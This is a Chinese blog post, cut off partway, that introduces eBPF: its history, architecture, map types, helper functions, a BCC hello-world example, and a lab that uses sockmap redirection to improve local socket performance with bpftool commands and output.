    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近因为一些原因开始学习eBPF，后续也将持续学习eBPF的一些具体应用。</p><h4 id="BPF发展史"><a href="#BPF发展史" class="headerlink" title="BPF发展史"></a>BPF发展史</h4><p><img src="/2022/01/21/浅入浅出eBPF/3.jpeg" alt="3"></p><h4 id="BPF介绍"><a href="#BPF介绍" class="headerlink" title="BPF介绍"></a>BPF介绍</h4><p>BPF(伯克利包过滤器)，也称为cBPF，在1992年提出，目的是为了提供一种过滤包的方法，并且要避免从内核空间到用户空间的无用的数据包复制行为。最初，BPF是在BSD内核实现的， 后来，由于其出色的设计思想，其他操作系统也将其引入, 包括Linux。</p><p>BPF架构如下图所示，从图中可以看到，BPF是作为内核报文传输路径的一个旁路存在，当报文到达内核驱动程序后，内核在将报文上送协议栈的同时，会额外将报文的副本交给BPF，之后报文会经过BPF内部逻辑的过滤。</p><p><img src="/2022/01/21/浅入浅出eBPF/1.png" alt="1"></p><h4 id="eBPF介绍"><a href="#eBPF介绍" class="headerlink" title="eBPF介绍"></a>eBPF介绍</h4><p>eBPF是扩展的BPF，2014 年初，Alexei Starovoitov 实现了 eBPF（extended Berkeley Packet Filter）。经过重新设计，eBPF 演进为一个通用执行引擎，可基于此开发性能分析工具、软件定义网络等诸多场景。eBPF 最早出现在 3.18 内核中，此后原来的 BPF 就被称为经典 BPF，缩写 cBPF（classic BPF），cBPF 现在已经基本废弃。现在，Linux 内核只运行 eBPF，内核会将加载的 cBPF 字节码透明地转换成 eBPF 再执行。</p><p>从eBPF官网摘录下段文字说明</p><p>eBPF is a revolutionary technology with origins in the Linux kernel that can run sandboxed programs in an operating system kernel. It is used to safely and efficiently extend the capabilities of the kernel without requiring to change kernel source code or load kernel modules.（一项革新性技术！！！有苹果发布会内味。起源于Linux内核，可以在操作系统内核中运行沙箱程序，被用来安全的扩展内核功能，不用去更改内核源码或加载内核模块）</p><p>Historically, the operating system has always been an ideal place to implement observability, security, and networking functionality due to the kernel’s privileged ability to oversee and control the entire system. At the same time, an operating system kernel is hard to evolve due to its central role and high requirement towards stability and security. The rate of innovation at the operating system level has thus traditionally been lower compared to functionality implemented outside of the operating system.（操作系统一直是实现可观测性、安全性和网络功能的最佳场所，因为内核具有监视和控制整个系统的权限。同时，由于其核心作用和对于稳定性和安全性的高要求，使得它很难进化。因此，和在操作系统之外实现的功能相比，操作系统级别的创新率就会偏低）</p><p>eBPF changes this formula fundamentally. By allowing to run sandboxed programs within the operating system, application developers can run eBPF programs to add additional capabilities to the operating system at runtime. The operating system then guarantees safety and execution efficiency as if natively compiled with the aid of a Just-In-Time (JIT) compiler and verification engine. This has led to a wave of eBPF-based projects covering a wide array of use cases, including next-generation networking, observability, and security functionality.（eBPF从根本上改变了这个功能，通过允许在操作系统内运行沙箱程序，应用开发者可以通过运行eBPF程序在操作系统运行时添加额外功能。操作系统会保证安全性和执行效率，就像在JIT编译器和验证器的帮助下进行本机编译一样。接着就出现了一系列基于eBPF的项目，例如下一代网络、可观察性和安全功能等）</p><p>Today, eBPF is used extensively to drive a wide variety of use cases: Providing high-performance networking and load-balancing in modern data centers and cloud native environments, extracting fine-grained security observability data at low overhead, helping application developers trace applications, providing insights for performance troubleshooting, preventive application and container runtime security enforcement, and much more. The possibilities are endless, and the innovation that eBPF is unlocked has only just begun.（今天，eBPF被用于驱动各种各样的用例，例如在数据中心和云本机环境提供高性能网络和负载均衡、以较低的开销提取细粒度安全可观测性数据、帮助应用程序开发人员跟踪应用程序、为性能故障排除提供一些方法，预防应用程序和容器运行时的安全实施等等，eBPF有无限可能，eBPF才刚刚开始）</p><h4 id="eBPF对比cBPF"><a href="#eBPF对比cBPF" class="headerlink" title="eBPF对比cBPF"></a>eBPF对比cBPF</h4><p><strong>eBPF</strong>相对于<strong>cBPF</strong>的增强如下:</p><ul><li>处理器原生指令集建模，因此更接近底层处理器架构， 性能相比cBPF提升4倍</li><li>指令集从33个扩展到了114多个，依然保持了足够的简洁</li><li>寄存器从2个32位寄存器扩展到了11个 64 位的寄存器 (其中1个只读的栈指针)</li><li>引入 bpf_call 指令和寄存器传参约定，实现零(额外)开销内核函数调用</li><li>虚拟机的最大栈空间是 512 字节(cBPF 为 16 个字节)</li><li>引入了 map 结构，用于用户空间程序与内核中的 eBPF 程序数据交换</li><li>最大指令数初期为 4096，现在已经将这个限制放大到了100万条</li></ul><h4 id="eBPF工作机制"><a href="#eBPF工作机制" class="headerlink" title="eBPF工作机制"></a>eBPF工作机制</h4><p><img src="/2022/01/21/浅入浅出eBPF/2.png" alt="2"></p><p>eBPF分为用户空间和内核空间，用户空间和内核空间的交互有两种方式</p><ul><li>BPF map：用于将内核中实现的统计摘要信息（比如测量延迟、堆栈信息）等回传至用户空间</li><li>perf-event：用于将内核采集的事件实时发送至用户空间，用户空间程序实时读取分析</li></ul><p>eBPF的工作逻辑是</p><ul><li>BPF程序通过<code>LLVM/Clang</code>编译成eBPF定义的字节码<code>prog.bpf</code></li><li>通过bpf系统调用将bpf字节码指令传入内核</li><li>经过验证器检验字节码的安全性<ul><li>加载eBPF程序的进程具有所需的权限，除非启用了非特权eBPF，否则只有特权进程才能加载eBPF程序</li><li>程序不会崩溃或以其它方式损坏系统</li><li>程序始终可以运行完成</li></ul></li><li>在确认字节码安全后将其加载对应的内核模块执行，在BPF虚拟机中会判断是否开启JIT(即时编译)，如果开启了JIT，则会通过JIT解释器将程序字节码转为特定的机器码执行，如果没有开启JIT，则通过内核解释器执行</li></ul><p>eBPF观测技术相关的程序类型有<code>kprobes</code>、<code>uporbes</code>、<code>tracepoint</code>、<code>perf_event</code></p><ul><li>kprobes：实现内核中动态跟踪。kprobes可以跟踪到Linux内核中的函数入口或返回点，但是不是稳定ABI接口，可能会因为内核版本变化导致，导致跟踪失效。理论上可以跟踪到所有导出的符号<code>/proc/kallsyms</code>。</li><li>uprobes：用户级别的动态跟踪。与kprobes类似，只是跟踪的函数为用户程序中的函数。</li><li>tracepoints：内核中静态跟踪。tracepoints是内核开发人员维护的跟踪点，能够提供稳定的ABI接口，但是由于是研发人员维护，数量和场景可能受限。</li><li>perf_events：定时采样和PMC。</li></ul><h4 id="eBPF使用场景"><a href="#eBPF使用场景" class="headerlink" title="eBPF使用场景"></a>eBPF使用场景</h4><ul><li>系统性能监控/分析工具：能够实现性能监控工具、分析工具等常用的系统分析工具，比如 sysstate 工具集，里面提供了 vmstate，pidstat 等多种工具，一些常用的 top、netstat（netstat 可被 SS 替换掉），uptime、iostat 等这些工具多数都是从 /proc、/sys、/dev 中获取的会对系统产生一定的开销，不适合频繁的调用。比如在使用 top 的时候通过 cpu 排序可以看到 top cpu 占用也是挺高的，使用 eBPF 可以在开销相对小的情况下获取系统信息，定时将 eBPF 采集的数据 copy 到用户态，然后将其发送到分析监控平台。</li><li>用户程序活体分析：做用户程序活体分析，比如 openresty 中 lua 火焰图绘制，程序内存使用监控，cdn 服务异常请求分析，程序运行状态的查看，这些操作都可以在程序无感的情况下做到，可以有效提供服务质量。</li><li>防御攻击：比如 DDoS 攻击，DDoS 攻击主要是在第七层、第三层以及第四层。第七层的攻击如 http 攻击，需要应用服务这边处理。第四层攻击，如 tcp syn 可以通过 iptable 拒绝异常的 ip，当然前提是能发现以及难点是如何区分正常流量和攻击流量，简单的防攻击会导致一些误伤，另外 tcp syn 也可以通过内核参数保护应用服务。第 3 层攻击，如 icmp。对于攻击一般会通过一些特殊的途径去发现攻击，而攻击的防御则可以通过 XDP 直接在网络包未到网络栈之前就处理掉，性能非常的优秀。</li><li>流控：可以控制网络传输速率，比如 tc。</li><li>替换 iptable：在 k8s 中iptable的规则往往会相当庞大，而iptable规则越多，性能也越差，使用eBPF就可以解决</li><li>服务调优：在cdn服务中难免会出现一些指标突刺的情况，这种突刺拉高整体的指标，对于这种突刺时常会因为找不到切入点而无从下手，eBPF存在这种潜力能帮助分析解决该问题，当eBPF发现网络抖动，会主动采集当时应用的运行状态。</li></ul><h4 id="eBPF-hooks"><a href="#eBPF-hooks" class="headerlink" title="eBPF hooks"></a>eBPF hooks</h4><p>eBPF hooks即eBPF钩子，指的是在内核中哪些地方可以加载eBPF程序，在目前的Linux内核中已经有近10中钩子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kernel functions（kprobes）</span><br><span class="line">userspace functions（uprobes）</span><br><span class="line">system calls</span><br><span class="line">fentry/fexit</span><br><span class="line">Tracepoints</span><br><span class="line">network devices（tc/xdp）</span><br><span class="line">network routes</span><br><span class="line">TCP congestion algorithms</span><br><span class="line">sockets（data level）</span><br></pre></td></tr></table></figure><h4 id="eBPF-Map"><a href="#eBPF-Map" class="headerlink" title="eBPF Map"></a>eBPF Map</h4><p>在eBPF中可以利用map在eBPF程序调用之间保存状态信息，也可以利用map在用户态程序和内核之间共享数据等。内核提供了一个系统调用<code>bpf()</code>，以让用户态程序可以根据使用场景来创建合适的map。这个系统调用会返回一个关联了这个map对象的文件描述符，后续用户态程序可以用这个文件描述符来对相应的map对象进行一些操作，如查询、更新和删除，这部分的接口在<code>tools/lib/bpf/bpf.h</code>中定义了。关于这个<code>bpf()</code>系统调用以及map操作接口的详细信息，可以参考相关资料，其中<code>bpf()</code>系统调用相关的信息可以在<code>man page</code>中找到，而map操作相关的接口可以在 <code>tools/lib/bpf/bpf.h</code> 中看到具体的实现。</p><p>eBPF支持的map类型如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">BPF_MAP_TYPE_HASH：哈希表</span><br><span class="line">BPF_MAP_TYPE_ARRAY：数组映射，已针对快速查找速度进行了优化，通常用于计数器</span><br><span class="line">BPF_MAP_TYPE_PROG_ARRAY：对应eBPF程序的文件描述符数组；用于实现跳转表和子程序以处理特定的数据包协议</span><br><span class="line">BPF_MAP_TYPE_PERCPU_ARRAY：每个CPU的阵列，用于实现延迟的直方图</span><br><span class="line">BPF_MAP_TYPE_PERF_EVENT_ARRAY：存储指向struct perf_event的指针，用于读取和存储perf事件计数器</span><br><span class="line">BPF_MAP_TYPE_CGROUP_ARRAY：存储指向控制组的指针</span><br><span class="line">BPF_MAP_TYPE_PERCPU_HASH：每个CPU的哈希表</span><br><span class="line">BPF_MAP_TYPE_LRU_HASH：仅保留最近使用项目的哈希表</span><br><span class="line">BPF_MAP_TYPE_LRU_PERCPU_HASH：每个CPU的哈希表，仅保留最近使用的项目</span><br><span class="line">BPF_MAP_TYPE_LPM_TRIE：最长前缀匹配树，适用于将IP地址匹配到某个范围</span><br><span class="line">BPF_MAP_TYPE_STACK_TRACE：存储堆栈跟踪</span><br><span class="line">BPF_MAP_TYPE_ARRAY_OF_MAPS：地图中地图数据结构</span><br><span class="line">BPF_MAP_TYPE_HASH_OF_MAPS：地图中地图数据结构</span><br><span class="line">BPF_MAP_TYPE_DEVICE_MAP：用于存储和查找网络设备引用</span><br><span class="line">BPF_MAP_TYPE_SOCKET_MAP：存储和查找套接字，并允许使用BPF辅助函数进行套接字重定向</span><br></pre></td></tr></table></figure><h4 id="eBPF-Helper-Function"><a href="#eBPF-Helper-Function" class="headerlink" title="eBPF Helper Function"></a>eBPF Helper Function</h4><p>eBPF程序不能调用任意内核函数。如果允许这样做，会将eBPF程序绑定到特定的内核版本，并且会使程序的兼容性复杂化。相反，eBPF程序可以对helper函数进行函数调用，helper函数是内核提供的一种稳定的API。</p><p><img src="/2022/01/21/浅入浅出eBPF/5.png" alt="5"></p><p>一些可用于辅助调用的例子有</p><ul><li>生成随机数</li><li>获取当前时间和日期</li><li>eBPF map访问</li><li>获取进程/cgroup上下文</li><li>操作网络数据包和转发逻辑</li></ul><h4 id="BCC"><a href="#BCC" class="headerlink" title="BCC"></a>BCC</h4><h5 id="bcc介绍"><a href="#bcc介绍" class="headerlink" title="bcc介绍"></a>bcc介绍</h5><p>源码地址：<a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener">https://github.com/iovisor/bcc</a></p><p>BCC工具全称BPF Compiler Collection (BCC)，是一个很强大的库，强大的内核分析工具eBPF就是基于bcc开发的，利用这个库可以从底层获取操作系统性能信息，网络性能信息等许多与内核交互的信息。bcc使得bpf程序更容易被书写，bcc使用 Python和Lua，虽然核心依旧是一部分C语言代码（BPF C代码）。但是我们很快就可以体验了，这比手动安装 C 语言依赖、编译、插入内核要方便的多。</p><h5 id="bcc-tools安装"><a href="#bcc-tools安装" class="headerlink" title="bcc-tools安装"></a>bcc-tools安装</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum -y install bcc-tools</span><br></pre></td></tr></table></figure><h5 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h5><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">BPF(text=<span class="string">'int kprobe__sys_clone(void *ctx)&#123;bpf_trace_printk("Hello,World!\\n"); return 0;&#125;'</span>).trace_print()</span><br></pre></td></tr></table></figure><p>执行如下</p><p><img src="/2022/01/21/浅入浅出eBPF/4.png" alt="4"></p><p>分析如下</p><ul><li><p>text定义了一个嵌入的用C语言写的BPF程序</p></li><li><p><code>kprobe__sys_clone()</code>是一个通过内核探针(kprobe)进行内核动态跟踪的快捷方式。如果一个C函数名开头为<code>kprobe__</code>，则后面部分实际为设备的内核函数名，这里是<code>sys_clone()</code></p></li><li><p><code>bpf_trace_printk()</code>用于<code>printf()</code>到<code>trace_pipe</code>。一般用来快速调试</p></li><li><p><code>return 0</code>用来关闭凭证</p></li><li><p><code>.trace_print()</code>，一个bcc实例会通过这个读取<code>trace_pipe</code>并打印</p></li></ul><h4 id="利用eBPF提升socket性能"><a href="#利用eBPF提升socket性能" class="headerlink" title="利用eBPF提升socket性能"></a>利用eBPF提升socket性能</h4><h5 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h5><p>本实验主要是利用ebpf sockmap/redirection来提升socket的性能。sockmap是 eBPF 提供的一个特殊的<code>eBPF MAP</code>类型，主要用于socket redirection，在 socket redirection中，socket被添加到sockmap中并由key（主要是四元组）引用，然后该 socket 在调用<code>bpf_sockmap_redirect()</code>时进行重定向。对于本地通信方式而言，这样可以绕过整个 TCP/IP 协议栈，直接将数据发送到 socket 对端，从而提高性能。</p><h5 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h5><p><a href="https://github.com/cyralinc/os-eBPF" target="_blank" rel="noopener">https://github.com/cyralinc/os-eBPF</a></p><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><ul><li>Ubuntu Linux 18.04 with 5.3.0-40-generic</li></ul><h5 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h5><h6 id="安装相应包"><a href="#安装相应包" class="headerlink" title="安装相应包"></a>安装相应包</h6><ul><li>sudo apt-get install -y make gcc libssl-dev bc libelf-dev libcap-dev clang gcc-multilib llvm libncurses5-dev git pkg-config libmnl-dev bison flex graphviz</li><li>sudo apt-get install iproute2</li><li>sudo apt install libbfd-dev libcap-dev zlib1g-dev libelf-dev libssl-dev</li></ul><h6 id="修改apt源"><a href="#修改apt源" class="headerlink" title="修改apt源"></a>修改apt源</h6><p><a href="https://blog.csdn.net/weixin_44143222/article/details/88592193" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44143222/article/details/88592193</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get source linux-image-$(uname -r)</span><br><span class="line">apt-get source linux-image-unsigned-$(uname -r)</span><br></pre></td></tr></table></figure><h6 id="或直接下载对应源码"><a href="#或直接下载对应源码" class="headerlink" title="或直接下载对应源码"></a>或直接下载对应源码</h6><ul><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></li></ul><h6 id="编译-bpftool-工具"><a href="#编译-bpftool-工具" class="headerlink" title="编译 bpftool 工具"></a>编译 bpftool 工具</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd linux-5.3/tools/bpf/bpftool</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h6 id="编译bpf字节码"><a href="#编译bpf字节码" class="headerlink" title="编译bpf字节码"></a>编译bpf字节码</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ clang -O2 -g -target bpf -I /usr/include/linux/ -I /usr/src/linux-headers-5.3.0-40/include/ -c bpf_sockops_v4.c  -o bpf_sockops_v4.o</span><br></pre></td></tr></table></figure><h6 id="加载bpf字节码"><a href="#加载bpf字节码" class="headerlink" title="加载bpf字节码"></a>加载bpf字节码</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog load bpf_sockops_v4.o "/sys/fs/bpf/bpf_sockops"</span><br><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool cgroup attach "/sys/fs/cgroup/unified/" sock_ops pinned "/sys/fs/bpf/bpf_sockops"</span><br></pre></td></tr></table></figure><h6 id="查看系统中已经加载的所有-BPF-程序"><a href="#查看系统中已经加载的所有-BPF-程序" class="headerlink" title="查看系统中已经加载的所有 BPF 程序"></a>查看系统中已经加载的所有 BPF 程序</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog show</span><br><span class="line">2: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 2,3</span><br><span class="line">3: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 2,3</span><br><span class="line">4: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 4,5</span><br><span class="line">5: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 4,5</span><br><span class="line">6: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:41:20+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 6,7</span><br><span class="line">7: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:41:20+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 6,7</span><br><span class="line">18: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-26T08:59:51+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 14</span><br></pre></td></tr></table></figure><h6 id="查看系统中所有的-map"><a href="#查看系统中所有的-map" class="headerlink" title="查看系统中所有的 map"></a>查看系统中所有的 map</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool map show</span><br><span class="line">2: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">3: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">4: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">5: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">6: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">7: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">14: sockhash  name sock_ops_map  flags 0x0</span><br><span class="line">key 24B  value 4B  max_entries 65535  memlock 0B</span><br></pre></td></tr></table></figure><h6 id="查看map的详情"><a href="#查看map的详情" class="headerlink" title="查看map的详情"></a>查看map的详情</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo bpftool -p map show id 14</span><br><span class="line">&#123;</span><br><span class="line">    "id": 14,</span><br><span class="line">    "type": "sockhash",</span><br><span class="line">    "name": "sock_ops_map",</span><br><span class="line">    "flags": 0,</span><br><span class="line">    "bytes_key": 24,</span><br><span class="line">    "bytes_value": 4,</span><br><span class="line">    "max_entries": 65535,</span><br><span class="line">    "bytes_memlock": 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="打印map中的内容"><a href="#打印map中的内容" class="headerlink" title="打印map中的内容"></a>打印map中的内容</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo bpftool -p map dump id 14</span><br><span class="line">[&#123;</span><br><span class="line">        "key": ["0xc0","0xa8","0x13","0x55","0x0a","0x34","0x23","0xa1","0x01","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x16","0x00","0x00","0xc4","0x08","0x00","0x00"</span><br><span class="line">        ],</span><br><span class="line">        "value": &#123;</span><br><span class="line">            "error": "Operation not supported"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="具体测试步骤"><a href="#具体测试步骤" class="headerlink" title="具体测试步骤"></a>具体测试步骤</h5><h6 id="执行load-sh脚本"><a href="#执行load-sh脚本" class="headerlink" title="执行load.sh脚本"></a>执行<code>load.sh</code>脚本</h6><p>这里需要根据内核版本对应修改一下<code>load.sh</code>中的代码，如下图所示</p><p><img src="/2022/01/21/浅入浅出eBPF/6.png" alt="6"></p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./load.sh </span><br><span class="line">+ set -e</span><br><span class="line">+ sudo mount -t bpf bpf /sys/fs/bpf/</span><br><span class="line">+ clang -O2 -g -target bpf -I/usr/include/linux/ -I/usr/src/linux-headers-5.3.0-40/include/ -c bpf_sockops_v4.c -o bpf_sockops_v4.o</span><br><span class="line">+ sudo bpftool prog load bpf_sockops_v4.o /sys/fs/bpf/bpf_sockops</span><br><span class="line">+ sudo bpftool cgroup attach /sys/fs/cgroup/unified/ sock_ops pinned /sys/fs/bpf/bpf_sockops</span><br><span class="line">++ sudo bpftool prog show pinned /sys/fs/bpf/bpf_sockops</span><br><span class="line">++ grep -o -E 'map_ids [0-9]+'</span><br><span class="line">++ cut -d ' ' -f2-</span><br><span class="line">+ MAP_ID=42</span><br><span class="line">+ sudo bpftool map pin id 42 /sys/fs/bpf/sock_ops_map</span><br><span class="line">+ clang -O2 -g -Wall -target bpf -I/usr/include/linux/ -I/usr/src/linux-headers-5.3.0-40/include/ -c bpf_tcpip_bypass.c -o bpf_tcpip_bypass.o</span><br><span class="line">+ sudo bpftool prog load bpf_tcpip_bypass.o /sys/fs/bpf/bpf_tcpip_bypass map name sock_ops_map pinned /sys/fs/bpf/sock_ops_map</span><br><span class="line">+ sudo bpftool prog attach pinned /sys/fs/bpf/bpf_tcpip_bypass msg_verdict pinned /sys/fs/bpf/sock_ops_map</span><br></pre></td></tr></table></figure><h6 id="确认BPF程序已经被加载进内核"><a href="#确认BPF程序已经被加载进内核" class="headerlink" title="确认BPF程序已经被加载进内核"></a>确认BPF程序已经被加载进内核</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog show</span><br><span class="line">18: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-26T08:59:51+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 14</span><br><span class="line">41: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 35,36</span><br><span class="line">42: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 35,36</span><br><span class="line">43: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 37,38</span><br><span class="line">44: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 37,38</span><br><span class="line">45: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 39,40</span><br><span class="line">46: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 39,40</span><br><span class="line">50: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-27T01:32:15+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 42</span><br><span class="line">54: sk_msg  name bpf_tcpip_bypas  tag 550f6d3cfcae2157  gpl</span><br><span class="line">loaded_at 2022-01-27T01:32:16+0000  uid 0</span><br><span class="line">xlated 224B  jited 151B  memlock 4096B  map_ids 42</span><br></pre></td></tr></table></figure><h6 id="查看固定在文件系统上的SOCKHASH映射"><a href="#查看固定在文件系统上的SOCKHASH映射" class="headerlink" title="查看固定在文件系统上的SOCKHASH映射"></a>查看固定在文件系统上的SOCKHASH映射</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 